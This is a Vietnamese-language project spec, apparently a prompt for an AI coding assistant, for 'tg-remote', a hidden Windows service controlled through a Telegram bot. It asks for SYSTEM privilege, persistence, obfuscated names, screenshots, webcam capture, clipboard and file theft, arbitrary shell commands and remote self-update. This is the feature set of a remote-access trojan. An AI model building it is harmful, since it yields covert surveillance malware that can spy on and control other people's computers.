Bạn là một Rust engineer đang xây dựng dự án `tg-remote` — một Windows remote-control agent
chạy ngầm dưới dạng Windows Service, điều khiển hoàn toàn qua Telegram Bot API.
Không có server riêng, không có heartbeat, không có webhook — chỉ dùng long polling.

## Ngôn ngữ & môi trường
- Ngôn ngữ: Rust edition 2021
- Target: Windows 10/11 (x86_64-pc-windows-msvc)
- Binary cuối: tg-remote.exe — chạy ngầm (windows_subsystem = "windows")

## Kiến trúc tổng thể

Mỗi PC chạy 1 agent (Windows Service). Tất cả agent dùng chung 1 bot token nhưng
hoạt động trong topic riêng của một Telegram Supergroup (topics enabled).

Routing hoàn toàn dựa vào Telegram topic:
- General topic (thread_id=1): chỉ có /list
- Mỗi PC có 1 topic riêng: tất cả lệnh khác
- Không có /switch, không có session state, không có heartbeat

Khi nhận Telegram update, mỗi PC:
1. Kiểm tra is_authorized(user_id == SUPER_USER_ID)
2. Nếu thread_id == 1 và lệnh là /list → reply danh sách PC
3. Nếu thread_id == own_topic_id → xử lý lệnh
4. Tất cả trường hợp khác → bỏ qua silently

## Machine ID

SHA256(hostname + MAC_address) → lấy 8 hex đầu
Label: "a3f9c102 @ DESKTOP-HOME"

Mỗi PC khi start lần đầu: gọi create_forum_topic() để tạo topic trong group,
lưu thread_id vào Windows Registry HKCU (hoặc HKLM nếu chạy dưới LocalSystem).

## Cấu trúc project bắt buộc

```
tg-remote/

├── Cargo.toml

├── [build.rs](http://build.rs)                     # bake config vào binary

└── src/

├── [main.rs](http://main.rs)                  # CLI: --install / --reinstall / --uninstall / SCM dispatch

├── bot/

│   ├── [mod.rs](http://mod.rs)               # run_until(shutdown_rx)

│   ├── [auth.rs](http://auth.rs)              # is_authorized()

│   ├── [router.rs](http://router.rs)            # BotCommands enum + dispatch

│   ├── [registry.rs](http://registry.rs)          # Vec<PcEntry> — danh sách PC đã đăng ký (static)

│   ├── [topics.rs](http://topics.rs)            # ensure_topic(), lưu topic_id vào Registry

│   └── rate_[limit.rs](http://limit.rs)        # Token Bucket per-command

├── machine/

│   ├── [mod.rs](http://mod.rs)

│   └── [identity.rs](http://identity.rs)          # machine_id() + machine_label()

├── commands/

│   ├── [mod.rs](http://mod.rs)

│   ├── [screenshot.rs](http://screenshot.rs)        # /screenshot → JPEG qua send_photo

│   ├── [shell.rs](http://shell.rs)             # /shell + /cancel — ActiveJob: Arc<Mutex<Option<RunningJob>>>

│   ├── [camera.rs](http://camera.rs)            # /camera → nokhwa

│   ├── [sysinfo.rs](http://sysinfo.rs)           # /sysinfo → sysinfo crate

│   ├── [files.rs](http://files.rs)             # /listfiles /getfile

│   ├── [procs.rs](http://procs.rs)             # /procs /kill

│   ├── [network.rs](http://network.rs)           # /netstat

│   ├── [clipboard.rs](http://clipboard.rs)         # /clipboard → clipboard-win

│   ├── [location.rs](http://location.rs)          # /location → IP geolocation HTTP API

│   ├── [system.rs](http://system.rs)            # /lock /shutdown /restart /abortshutdown /run

│   ├── [ping.rs](http://ping.rs)              # /ping → uptime + IP local + version

│   ├── [status.rs](http://status.rs)            # /status → PID + uptime + job status

│   ├── [notify.rs](http://notify.rs)            # start_login_watcher() — WTS WM_WTSSESSION_CHANGE

│   └── [wallpaper.rs](http://wallpaper.rs)         # /wallpaper → đọc HKCU registry path rồi send_document

├── security/

│   ├── [mod.rs](http://mod.rs)

│   ├── [dpapi.rs](http://dpapi.rs)             # CryptProtectData / CryptUnprotectData (windows-sys)

│   └── [obfuscation.rs](http://obfuscation.rs)       # obfstr! wrappers cho sensitive strings

├── updater/

│   ├── [mod.rs](http://mod.rs)

│   └── self_[update.rs](http://update.rs)       # /update: download → sha256 verify → rename + restart

└── service/

├── [mod.rs](http://mod.rs)

├── [config.rs](http://config.rs)            # load(): baked config ưu tiên → Registry fallback

├── [install.rs](http://install.rs)           # install() / uninstall() SCM + failure policy

└── windows_[svc.rs](http://svc.rs)       # define_windows_service! + service_main + dispatch

```

## AgentState (truyền qua handler)

```

pub struct AgentState {

pub registry:      Vec<PcEntry>,

pub active_job:    ActiveJob,              // Arc<Mutex<Option<RunningJob>>>

pub own_topic_id:  i32,

pub own_label:     String,

pub agent_version: &'static str,           // env!("CARGO_PKG_VERSION")

}

pub struct PcEntry {

pub machine_id: String,

pub label:      String,

pub topic_id:   i32,

}

```

## Config loading (service/config.rs)

Thu tự ưu tiên:
1. BAKED_TOKEN / BAKED_UID / BAKED_GID (nhúng vào binary qua build.rs)
2. Windows Registry HKLM\SOFTWARE\TgRemoteAgent (DPAPI encrypted, base64)

Nếu cả hai thiếu → bail! với thông báo rõ ràng.

## build.rs (bake config vào binary)

```

fn main() {

let token = std::env::var("TG_BOT_TOKEN").unwrap_or_default();

let uid   = std::env::var("TG_SUPER_USER_ID").unwrap_or_default();

let gid   = std::env::var("TG_GROUP_ID").unwrap_or_default();

println!("cargo:rustc-env=BAKED_TOKEN={token}");

println!("cargo:rustc-env=BAKED_UID={uid}");

println!("cargo:rustc-env=BAKED_GID={gid}");

println!("cargo:rerun-if-env-changed=TG_BOT_TOKEN");

println!("cargo:rerun-if-env-changed=TG_SUPER_USER_ID");

println!("cargo:rerun-if-env-changed=TG_GROUP_ID");

}

```

Build với baked config:
```

$env:TG_BOT_TOKEN="..."; $env:TG_SUPER_USER_ID="..."; $env:TG_GROUP_ID="..."

cargo build --release

```

## CLI (main.rs)

```

--install [TOKEN UID GID]   # nếu có baked config thì không cần args

--reinstall TOKEN UID GID   # chỉ update Registry, không reinstall service

--uninstall

(no args)                   # SCM dispatch → service_main

```

## Windows Service

- Dùng crate `windows-service 0.8`
- Account: LocalSystem (SYSTEM privilege)
- Start type: AutoStart
- SCM failure policy: restart sau 5s / 10s / 30s, reset sau 24h
- Shutdown: shutdown_tx.send() → dispatcher.abort() → set Stopped

## Danh sách lệnh Telegram

### Điều hướng
| Lệnh | Gửi tại | Mô tả |
|------|---------|-------|
| /list | General topic | Danh sách PC đã đăng ký |
| /ping | Topic PC | PONG + uptime + IP + version |
| /status | Topic PC | PID + uptime + job shell hiện tại |
| /help | Bất kỳ | Danh sách lệnh |

### Thu thập thông tin
| /screenshot | /camera | /sysinfo | /location | /clipboard | /netstat | /wallpaper |

### File
| /listfiles <path> | /getfile <path> |

### Process
| /procs | /kill <pid> | /run <path> |

### Shell
| /shell <cmd> | /cancel |

### Hệ thống
| /lock | /shutdown | /restart | /abortshutdown | /history |

### Agent
| /uninstall | /update <url> [sha256] |

## Routing logic chính xác

```

// msg.thread_id trả về Option<MessageThreadId> trong teloxide 0.17

// KHÔNG phải Option<i32>

const GENERAL_TOPIC_ID: i32 = 1;

pub fn is_general(msg: &Message) -> bool {

msg.thread_id == Some(MessageThreadId(GENERAL_TOPIC_ID))

}

pub fn is_for_me(msg: &Message, own: i32) -> bool {

msg.thread_id == Some(MessageThreadId(own))

}

// Trong router dispatch:

match &cmd {

Cmd::List => {

if is_general(&msg) { reply_pc_list(...).await?; }

return Ok(());

}

Cmd::Cancel => {

if is_for_me(&msg, state.own_topic_id) {

cancel(...).await?;

}

return Ok(());

}

_ => {

if !is_for_me(&msg, state.own_topic_id) { return Ok(()); }

// rate limit check trước khi dispatch

let name = cmd_name(&cmd);

if let Err(secs) = state.rate_limiter.check(name) {

bot.send_message(chat_id, format!("Cooldown {}s", secs)).await?;

return Ok(());

}

// dispatch lệnh...

}

}

```

## Rate Limiting (Token Bucket)

```

// Mutex<HashMap<&str, Bucket>> — không dùng DashMap

// Rules:

("screenshot", capacity=3,  refill=0.1   ),  // 1/10s

("camera",     capacity=2,  refill=0.067 ),  // 1/15s

("shell",      capacity=5,  refill=0.2   ),  // 1/5s

("getfile",    capacity=3,  refill=0.1   ),  // 1/10s

("procs",      capacity=5,  refill=0.2   ),  // 1/5s

("sysinfo",    capacity=10, refill=0.333 ),  // 1/3s

("netstat",    capacity=5,  refill=0.2   ),  // 1/5s

("shutdown",   capacity=1,  refill=0.017 ),  // 1/60s

("restart",    capacity=1,  refill=0.017 ),  // 1/60s

("update",     capacity=1,  refill=0.003 ),  // 1/300s

```

## Shell + Cancel

```

pub type ActiveJob = Arc<Mutex<Option<RunningJob>>>;

pub struct RunningJob { pub pid: u32, pub handle: JoinHandle<()> }

// shell::run(): spawn tokio task, lưu handle vào ActiveJob

// cancel(): active_job.lock().unwrap().take() → handle.abort()

// Nếu đang có job khi nhận /shell mới → từ chối, yêu cầu /cancel trước

```

## /ping implementation

```

// Lấy IP local bằng UDP trick (không gửi packet thật)

use std::net::UdpSocket;

let s = UdpSocket::bind("0.0.0.0:0")?;

s.connect("8.8.8.8:80")?;

let ip = s.local_addr()?.ip().to_string();

```

## Self-update (/update)

Flow: download → sha256 verify → rename exe → move tmp → sc stop → sc start → xóa .old
Vì Windows không cho replace file đang chạy trực tiếp.

## DPAPI (security/dpapi.rs)

```

use windows_sys::Win32::Security::Cryptography::{CryptProtectData, CryptUnprotectData, CRYPTOAPI_BLOB};

use windows_sys::Win32::Foundation::LocalFree;

// Dùng std::ptr::null() / std::ptr::null_mut() — không import ptr riêng

// LocalFree(ptr as isize) — không phải *mut _

```

## Obfuscation (security/obfuscation.rs)

```

pub fn service_name()   -> &'static str { obfstr::obfstr!("TgRemoteAgent") }

pub fn registry_path()  -> String       { obfstr::obfstr!(r"SOFTWARETgRemoteAgent").to_owned() }

pub fn service_display()-> &'static str { obfstr::obfstr!("Telegram Remote Agent") }

```

Tất cả string nhạy cảm phải đi qua module này.

## Login Alert (commands/notify.rs)

Dùng WTS API — RegisterClassExW + CreateWindowExW (HWND_MESSAGE) +
WTSRegisterSessionNotification → GetMessageW loop trong thread OS riêng.
Khi WM_WTSSESSION_CHANGE + wParam == WTS_SESSION_LOGON:
  WTSQuerySessionInformationW → lấy username → mpsc::channel → tokio task → bot.send_message

## Cargo.toml dependencies

```

[dependencies]

teloxide      = { version = "0.17", features = ["macros"] }

tokio         = { version = "1.50.0",    features = ["full"] }

sha2          = "**0.10.9**"

hex           = "**0.4.3**"

screenshots   = "0.8.10"

sysinfo       = "**0.38.4**"

image         = "**0.25.10**"

chrono        = "**0.4.44**"

log           = "**0.4.29**"

env_logger    = "**0.11.9**"

dashmap       = "**6.1.0**"

tempfile      = "**3.27.0**"

nokhwa        = { version = "0.10.10", features = ["input-native"] }

reqwest       = { version = "**0.13.2**", features = ["stream"] }

obfstr        = "**0.4.4**"

base64        = "**0.22.1**"

anyhow        = "**1.0.102**"

[target.'cfg(windows)'.dependencies]

windows-service = "0.8"

winreg          = "0.56"

clipboard-win   = "**5.4.1**"

windows-sys     = { version = "0.61.2", features = [

"Win32_UI_WindowsAndMessaging",

"Win32_System_Services",

"Win32_Security_Cryptography",

"Win32_Foundation",

"Win32_System_Threading",

"Win32_System_SystemInformation",

"Win32_System_Registry",

"Win32_System_RemoteDesktop",

]}

[profile.release]

opt-level     = 3

strip         = true

lto           = true

codegen-units = 1

panic         = "abort"

```

## Quy tắc bắt buộc khi implement

1. msg.thread_id trả về Option<MessageThreadId>, không phải Option<i32>
2. LocalFree nhận isize, không phải *mut _
3. Dùng std::ptr::null() / std::ptr::null_mut() inline, không import ptr
4. Rate limiter dùng Mutex<HashMap>, không dùng DashMap
5. Mọi string nhạy cảm (service name, registry path) phải qua obfuscation module
6. Config load: baked config ưu tiên, Registry là fallback
7. Không bao giờ đọc stdin — config chỉ qua CLI args hoặc baked
8. /cancel bypass rate limit — kiểm tra trước rate limit check
9. /list chỉ hoạt động ở General topic (thread_id == 1), mọi lệnh khác bỏ qua silently
10. AgentState phải có agent_version = env!("CARGO_PKG_VERSION")
11. PcEntry không có last_seen — không có heartbeat, không có online filter
12. Shell output cắt ở 3800 chars để an toàn với Telegram 4096 limit (còn chỗ cho markdown)

## Thứ tự implement

Phase 1 — Core chạy được:
1. Cargo.toml + build.rs
2. service/ (config, install, windows_svc)
3. machine/identity.rs
4. security/ (dpapi, obfuscation)
5. bot/ (auth, registry, topics, rate_limit)
6. main.rs (CLI args + SCM dispatch)
7. commands/ping.rs + commands/status.rs
8. bot/router.rs (minimal: /ping /status /list /help)
9. Test: build + install + /ping

Phase 2 — Lệnh cơ bản:
10. commands/screenshot.rs
11. commands/shell.rs (+ /cancel)
12. commands/sysinfo.rs
13. commands/system.rs (/lock /shutdown /restart /abortshutdown)
14. Mở rộng router cho tất cả lệnh

Phase 3 — Lệnh nâng cao:
15. commands/files.rs
16. commands/procs.rs
17. commands/network.rs
18. commands/clipboard.rs
19. commands/location.rs
20. commands/camera.rs
21. commands/wallpaper.rs
22. updater/self_update.rs
23. commands/notify.rs (WTS login)

> Notion page tham khảo đầy đủ: [Telegram Remote Bot — Project Plan](https://www.notion.so/Telegram-Remote-Bot-Project-Plan-32ae5e94b13a810c8963eda242be8c97?pvs=21)
>
